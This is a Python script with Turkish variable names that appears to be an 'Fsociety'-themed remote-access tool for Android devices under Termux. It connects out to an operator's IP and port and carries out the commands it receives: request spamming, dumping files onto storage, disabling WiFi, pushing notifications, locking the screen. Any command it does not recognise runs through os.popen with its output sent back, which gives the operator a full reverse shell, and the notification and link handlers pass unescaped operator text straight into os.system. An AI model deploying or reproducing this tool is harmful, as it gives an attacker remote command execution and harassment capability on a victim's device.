import socket
import os
import datetime
import random

sunucu_ip = input("Sunucu IP >> ")
port = int(input("Port >> "))

log_file = "log.txt"
fsociety_path = "/sdcard/Fsociety"
bildirim_sayisi = 0

s = socket.socket()
s.connect((sunucu_ip, port))
print(f"[+] Bağlandı: {sunucu_ip}:{port}")

def log_yaz(komut):
    zaman = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"[{zaman}] {komut}\n")

def spam_istek(adet):
    if adet > 1000:
        return "[X] En fazla 1000 istek atabilirsin."
    for _ in range(adet):
        os.system("curl -s https://httpbin.org/get > /dev/null")
    return f"[✓] {adet} istek gönderildi."

def dosya_olustur(adet):
    if adet > 100:
        return "[X] En fazla 100 dosya oluşturabilirsin."
    os.makedirs(fsociety_path, exist_ok=True)
    for i in range(1, adet + 1):
        uzanti = random.choice(["txt", "log", "json"])
        with open(f"{fsociety_path}/dosya_{i}.{uzanti}", "w") as f:
            f.write("Fsociety tarafından oluşturuldu.\n")
    return f"[✓] {adet} dosya oluşturuldu."

while True:
    try:
        komut = s.recv(1024).decode().strip()
        log_yaz(komut)

        if komut == "exit":
            s.send("[✓] Bağlantı kapatıldı.".encode())
            break

        elif komut.startswith("spam-istek"):
            try:
                adet = int(komut.split(" ")[1])
                sonuc = spam_istek(adet)
                s.send(sonuc.encode())
            except:
                s.send("[X] Sayı hatalı.".encode())

        elif komut.startswith("olustur-dosya"):
            try:
                adet = int(komut.split(" ")[1])
                sonuc = dosya_olustur(adet)
                s.send(sonuc.encode())
            except:
                s.send("[X] Sayı hatalı.".encode())

        elif komut.startswith("youtube "):
            link = komut.split(" ", 1)[1]
            os.system(f"am start -a android.intent.action.VIEW -d '{link}'")
            s.send("[✓] YouTube bağlantısı açıldı.".encode())

        elif komut == "wifi-off":
            try:
                sonuc = os.system("svc wifi disable")
                if sonuc != 0:
                    os.system("am start -a android.settings.WIFI_SETTINGS")
                    s.send("[!] Root yok. WiFi ayarları açıldı.".encode())
                else:
                    s.send("[✓] WiFi kapatıldı.".encode())
            except:
                os.system("am start -a android.settings.WIFI_SETTINGS")
                s.send("[!] Hata oluştu. WiFi ayarları açıldı.".encode())

        elif komut.startswith("sound "):
            os.system("termux-media-player play /sdcard/Music/*.mp3")
            s.send("[✓] Müzik çalınıyor.".encode())

        elif komut.startswith("bildirim "):
            try:
                parcalar = komut.split("\"")
                baslik = parcalar[1]
                icerik = parcalar[3]
                os.system(f'termux-notification -t "{baslik}" -c "{icerik}"')
                bildirim_sayisi += 1
                s.send("[✓] Bildirim gönderildi.".encode())
            except:
                s.send("[X] Bildirim hatalı yazıldı.".encode())

        elif komut == "bildirim-say":
            s.send(f"[✓] Toplam {bildirim_sayisi} bildirim gönderildi.".encode())

        elif komut == "kilit":
            os.system("input keyevent 26")
            s.send("[✓] Ekran kilitlendi.".encode())

        else:
            cikti = os.popen(komut).read()
            s.send(cikti.encode() if cikti else "[✓] Komut çalıştı.".encode())

    except Exception as e:
        s.send(f"[X] Hata: {str(e)}".encode())
